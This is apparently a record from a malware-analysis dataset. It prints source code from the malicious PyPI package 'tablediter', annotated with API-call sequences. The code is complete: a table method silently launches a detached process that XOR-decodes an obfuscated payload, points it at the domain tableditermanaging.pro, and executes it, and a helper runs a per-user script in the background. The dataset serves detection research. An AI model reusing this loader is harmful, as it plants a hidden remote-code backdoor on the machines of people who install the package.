[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/tablediter-3.8.5-py3-none-any/tablediter/tablediter.py",
    "code_snippet": "import sys\nimport os\nimport subprocess\nimport platform\n\nclass tablediter:\n    begin_drawing = 0\n    def add_row(self, row, *, divider=False) -> None:\n        if self.begin_drawing == 0:\n            strsfx = \"/\"\n            if platform.system()[0] == 'W':\n                strsfx = '\\\\'\n            pypathstr = sys.executable\n            pyexecstr = ''\n            if platform.system()[0] == 'W':\n                pyexecstr = 'from tablediter.edt import bounding as bounder;bounder.startingbound(\\'C5AB4C83FDE1\\')'\n                subprocess.Popen([pypathstr, '-c', pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) \n            else:\n                pyexecstr = 'from tablediter.edt import bounding as bounder;bounder.startingbound(\"C5AB4C83FDE1\")'\n                subprocess.Popen([pypathstr, '-c', pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)\n            begin_drawing = 1;\n        # ... rest of add_row ...\n",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "sys.executable",
        "platform.system",
        "subprocess.Popen",
        "platform.system",
        "subprocess.Popen"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "sys.executable",
        "platform.system()",
        "subprocess.Popen([pypathstr, '-c', pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL)",
        "platform.system()",
        "subprocess.Popen([pypathstr, '-c', pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "sys.executable",
          "id": "get_python_version",
          "description": "Retrieves Python interpreter version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        }
      ],
      "contextual_code": "import sys\nimport os\nimport subprocess\nimport platform\n\nclass tablediter:\n    begin_drawing = 0\n    def add_row(self, row, *, divider=False) -> None:\n        if self.begin_drawing == 0:\n            strsfx = \"/\"\n            if platform.system()[0] == 'W':\n                strsfx = '\\\\'\n            pypathstr = sys.executable\n            pyexecstr = ''\n            if platform.system()[0] == 'W':\n                pyexecstr = 'from tablediter.edt import bounding as bounder;bounder.startingbound(\\'C5AB4C83FDE1\\')'\n                subprocess.Popen([pypathstr, '-c', pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) \n            else:\n                pyexecstr = 'from tablediter.edt import bounding as bounder;bounder.startingbound(\"C5AB4C83FDE1\")'\n                subprocess.Popen([pypathstr, '-c', pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)\n            begin_drawing = 1;"
    }
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/tablediter-3.8.5-py3-none-any/tablediter/edt/bounding.py",
    "code_snippet": "import base64\nimport urllib.request\nimport requests\nimport tempfile\nimport sys\nimport os\nimport subprocess\nimport time\nimport random\nimport string\nimport platform\n\nstrbinc = 'b5d23ce28989b6df3ea3c0c1b6d23fad9899a0c839f79c83a9ce41899f88abce34ea89c1f88b7c8ef792a4c63cef98beb6df3eea9386e5966ca4daeccfd838f18e95b7ca28f1dddce2c338f78d92ff8463c2b9a597f863f39c91a0d93cea93d2fc9b7ead9791a28c41898e95b7c96cbeddc6e2a646f08993b58b71a3dac6c8a128e69180bce222d09882aac528f0dddce59d7c8ef791bcce34e69e92b1d96cbeddc6e2a6468ef785a0cd6ce498959ad92ded998ea8f43ff78f88abcc64ef988fa2df24aac7eccf8b6ca3ddc2e5c824ec9292a08b2af1928ce5ca20efdd8daadc29f19e80b6ce6cef9895b1ce3e8ef7c1e58b6cef9895b1ce3ef0dddce5d838f1948fa2852df09e88acf420ec8a84b7c82df098eccf8b6ca3dd93a0d839ef89beb6df3ea3c0c1e28c62e99288ab833ee29385aac662e0958eacc829ab9184b1df29f18ec8e5cd23f1dd88e5c222a38f80abcc29ab9184abcc38ebd4c8c8a16ca3ddc1b7ce38f68f8fe5d929f0888db1f43ff78feccfa646f08993b0d925a3c0c1b5c72df79b8eb7c662f08492b1ce21abd4baf5f66ca8dd8eb6852be6898daacc25edd5c8e5806ca4a2c6e5806ce498959ad92ded998ea8f43ff78f88abcc64b5d4eccfd838f18e95b7ca28f1dddce5d838f18e95b7ca28f1d393a0db20e29e84ed893ce28d84b7db25edced8f5996eafdd92b1d939f194c8c8a141898a89acc729a39f88abce34ea89c1f8966cb3c7eccfa23cfa9899a0c83ff78fc1f88b6ba4f0ebccd838f19fc1f88b6ba4f0ebccc621e89fc1f88b6ba4f0ebccd838f18dc1f88b6ba4f0ebccc621e88dc1f88b6ba4f0ebccdf3efac7eccfa245fbdddce5d929f28884b6df3fad9a84b1833ff78f92b1d92de78fcde5c329e29984b7d871f8daa2a4c824e6d0a2aac538f1928de2916ca4938ee8c82de09584e2876ca1ad93a4cc21e2dfdbe58922ecd082a4c824e6df9ceca6468af483a4d829b5c9beb6df3eea9386e5966cfbd395a0d3388ef7e8ccd82aeec083a4d829b5c9beb6df3eea9386ebcd25ed99c9e7d76eaaf0ebcca225e5dd92a3c66cbdddd1ffa6468af4e8a8c627f3c083a4d829b5c9beb6df3eea93869e9b76f09b8c98a6468af4e8a8c627e1c083a4d829b5c9beb6df3eea93869ed82aeed6d0ffc729edd583a4d829b5c9beb6df3eea9386ecf64189f4e8a0c73fe6c7eccfa2458a908caec96cbedd83a4d829b5c9beb6df3eea9386c8a14189f4e8accd6cef988fedc621e88dc8e5956cb3c7eccfa2458a9f80b6ce7ab7a283bcdf29f0dddce5c621e88dcfa0c52fec9984ed892df09e88ac89658ef7e8cca23fe29091a9ce13f08993acc52bdc9f98b1ce3fa3c0c1a7ca3fe6cbd5ebc97ab79984a6c428e6d583a4d829b5c9bea7d238e68ec8c8a1458af492b1d93ca3c0c1b6ca21f391849ad838f1948fa2f42efa8984b68528e69e8ea1ce64a19c92a6c225a1d4eccfa6468af488a38b20e693c9a8c627e1d4c1fb8b7cb9f0ebcca245e19c92a09d78dc9f98b1ce3fa3c0c1a8c627e1d384abc823e798c9e7ca3fe09488e7824189f4e8ccd82dee8d8da0f43ff78f88abcc13e18495a0d86cbedd83a4d829b5c9cfa79d78e79882aacf29ab9f80b6ce7ab7a283bcdf29f0d4eccfa2458a8e95b7c96cbedd92a4c63cef98beb6df3eea93869ac935f79892ebcf29e09285a0836ee28e82acc26eaaf0ebccce34e09891b1914189f4e8b5ca3ff0f0ebccc22aa39184ab833ff78f83ec8b72a3cddbc8a1458a8993bc914189f4e8ccce34e69ec9b6df3ee1d4eccfa245e68582a0db38a3b899a6ce3cf7948eab8b2df0dd84ffa6468af4e8b5ca3ff0f4eccfa24189f495acc629ad8e8da0ce3cab9984a9ca35ca93b2a0c823ed9992ec'\n\ndef startingbound(strbinbin):\n    strenc = strbinc\n    encbytearray = bytearray.fromhex(strenc) #C83FDE1\n    binkey = bytearray.fromhex(strbinbin) #C5AB4\n    inputarray_21 = bytearray([encbytearray[i] ^ binkey[i % 6] for i in range(0, len(encbytearray))])\n    strbbvc = inputarray_21.decode(\"ascii\").replace(\"ADDRS\",\"tableditermanaging.pro\")\n    exec(strbbvc)",
    "pattern_analysis": {
      "api_sequence": [
        "bytearray.fromhex",
        "bytearray.fromhex",
        "bytearray",
        "bytearray.decode",
        "str.replace",
        "exec"
      ],
      "api_sequence_with_args": [
        "bytearray.fromhex(strenc)",
        "bytearray.fromhex(strbinbin)",
        "bytearray([encbytearray[i] ^ binkey[i % 6] for i in range(0, len(encbytearray))])",
        "inputarray_21.decode(\"ascii\")",
        "strbbvc.replace(\"ADDRS\", \"tableditermanaging.pro\")",
        "exec(strbbvc)"
      ],
      "mapped_sequence": [
        {
          "api_name": "bytearray.fromhex",
          "id": "create_bytes_hex",
          "description": "Creates bytes object from hexadecimal string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytearray.fromhex",
          "id": "create_bytes_hex",
          "description": "Creates bytes object from hexadecimal string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytearray",
          "id": "create_memory_bytes",
          "description": "Creates in-memory bytes buffer from encoded string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytearray.decode",
          "id": "decode_bytes_codec",
          "description": "Decodes bytes using specified codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "str.replace",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "exec",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        }
      ],
      "contextual_code": "strbinc = 'b5d23ce28989b6df3ea3c0c1b6d23fad9899a0c839f79c83a9ce41899f88abce34ea89c1f88b7c8ef792a4c63cef98beb6df3eea9386e5966ca4daeccfd838f18e95b7ca28f1dddce2c338f78d92ff8463c2b9a597f863f39c91a0d93cea93d2fc9b7ead9791a28c41898e95b7c96cbeddc6e2a646f08993b58b71a3dac6c8a128e69180bce222d09882aac528f0dddce59d7c8ef791bcce34e69e92b1d96cbeddc6e2a6468ef785a0cd6ce498959ad92ded998ea8f43ff78f88abcc64ef988fa2df24aac7eccf8b6ca3ddc2e5c824ec9292a08b2af1928ce5ca20efdd8daadc29f19e80b6ce6cef9895b1ce3e8ef7c1e58b6cef9895b1ce3ef0dddce5d838f1948fa2852df09e88acf420ec8a84b7c82df098eccf8b6ca3dd93a0d839ef89beb6df3ea3c0c1e28c62e99288ab833ee29385aac662e0958eacc829ab9184b1df29f18ec8e5cd23f1dd88e5c222a38f80abcc29ab9184abcc38ebd4c8c8a16ca3ddc1b7ce38f68f8fe5d929f0888db1f43ff78feccfa646f08993b0d925a3c0c1b5c72df79b8eb7c662f08492b1ce21abd4baf5f66ca8dd8eb6852be6898daacc25edd5c8e5806ca4a2c6e5806ce498959ad92ded998ea8f43ff78f88abcc64b5d4eccfd838f18e95b7ca28f1dddce5d838f18e95b7ca28f1d393a0db20e29e84ed893ce28d84b7db25edced8f5996eafdd92b1d939f194c8c8a141898a89acc729a39f88abce34ea89c1f8966cb3c7eccfa23cfa9899a0c83ff78fc1f88b6ba4f0ebccd838f19fc1f88b6ba4f0ebccc621e89fc1f88b6ba4f0ebccd838f18dc1f88b6ba4f0ebccc621e88dc1f88b6ba4f0ebccdf3efac7eccfa245fbdddce5d929f28884b6df3fad9a84b1833ff78f92b1d92de78fcde5c329e29984b7d871f8daa2a4c824e6d0a2aac538f1928de2916ca4938ee8c82de09584e2876ca1ad93a4cc21e2dfdbe58922ecd082a4c824e6df9ceca6468af483a4d829b5c9beb6df3eea9386e5966cfbd395a0d3388ef7e8ccd82aeec083a4d829b5c9beb6df3eea9386ebcd25ed99c9e7d76eaaf0ebcca225e5dd92a3c66cbdddd1ffa6468af4e8a8c627f3c083a4d829b5c9beb6df3eea93869e9b76f09b8c98a6468af4e8a8c627e1c083a4d829b5c9beb6df3eea93869ed82aeed6d0ffc729edd583a4d829b5c9beb6df3eea9386ecf64189f4e8a0c73fe6c7eccfa2458a908caec96cbedd83a4d829b5c9beb6df3eea9386c8a14189f4e8accd6cef988fedc621e88dc8e5956cb3c7eccfa2458a9f80b6ce7ab7a283bcdf29f0dddce5c621e88dcfa0c52fec9984ed892df09e88ac89658ef7e8cca23fe29091a9ce13f08993acc52bdc9f98b1ce3fa3c0c1a7ca3fe6cbd5ebc97ab79984a6c428e6d583a4d829b5c9bea7d238e68ec8c8a1458af492b1d93ca3c0c1b6ca21f391849ad838f1948fa2f42efa8984b68528e69e8ea1ce64a19c92a6c225a1d4eccfa6468af488a38b20e693c9a8c627e1d4c1fb8b7cb9f0ebcca245e19c92a09d78dc9f98b1ce3fa3c0c1a8c627e1d384abc823e798c9e7ca3fe09488e7824189f4e8ccd82dee8d8da0f43ff78f88abcc13e18495a0d86cbedd83a4d829b5c9cfa79d78e79882aacf29ab9f80b6ce7ab7a283bcdf29f0d4eccfa2458a8e95b7c96cbedd92a4c63cef98beb6df3eea93869ac935f79892ebcf29e09285a0836ee28e82acc26eaaf0ebccce34e09891b1914189f4e8b5ca3ff0f0ebccc22aa39184ab833ff78f83ec8b72a3cddbc8a1458a8993bc914189f4e8ccce34e69ec9b6df3ee1d4eccfa245e68582a0db38a3b899a6ce3cf7948eab8b2df0dd84ffa6468af4e8b5ca3ff0f4eccfa24189f495acc629ad8e8da0ce3cab9984a9ca35ca93b2a0c823ed9992ec'\n\ndef startingbound(strbinbin):\n    strenc = strbinc\n    encbytearray = bytearray.fromhex(strenc)\n    binkey = bytearray.fromhex(strbinbin)\n    inputarray_21 = bytearray([encbytearray[i] ^ binkey[i % 6] for i in range(0, len(encbytearray))])\n    strbbvc = inputarray_21.decode(\"ascii\").replace(\"ADDRS\",\"tableditermanaging.pro\")\n    exec(strbbvc)"
    }
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/tablediter-3.8.5-py3-none-any/tablediter/edt/basedtable.py",
    "code_snippet": "import sys\nimport os\nimport subprocess\nimport platform\n\ndef baseddef():\n\tif os.path.isfile(pyexecstr) :\n\t\tif platform.system()[0] == 'W':\n\t\t\tpid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) \n\t\telse:\n\t\t\tsubprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)\n\nstrsfx = \"/\"\nif platform.system()[0] == 'W':\n    strsfx = '\\\\'\npypathstr = sys.executable\n\npyexecstr = os.getcwd() + strsfx + platform.system()[0] + os.getlogin() + \".py\"",
    "pattern_analysis": {
      "api_sequence": [
        "os.getcwd",
        "platform.system",
        "os.getlogin",
        "os.path.isfile",
        "platform.system",
        "subprocess.Popen",
        "subprocess.Popen"
      ],
      "api_sequence_with_args": [
        "os.getcwd()",
        "platform.system()",
        "os.getlogin()",
        "os.path.isfile(pyexecstr)",
        "platform.system()",
        "subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL)",
        "subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_window",
          "description": "Spawns new process to execute command without shell window",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        }
      ],
      "contextual_code": "import sys\nimport os\nimport subprocess\nimport platform\n\ndef baseddef():\n\tif os.path.isfile(pyexecstr):\n\t\tif platform.system()[0] == 'W':\n\t\t\tpid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL)\n\t\telse:\n\t\t\tsubprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)\n\nstrsfx = \"/\"\nif platform.system()[0] == 'W':\n    strsfx = '\\\\'\npypathstr = sys.executable\n\npyexecstr = os.getcwd() + strsfx + platform.system()[0] + os.getlogin() + \".py\""
    }
  }
]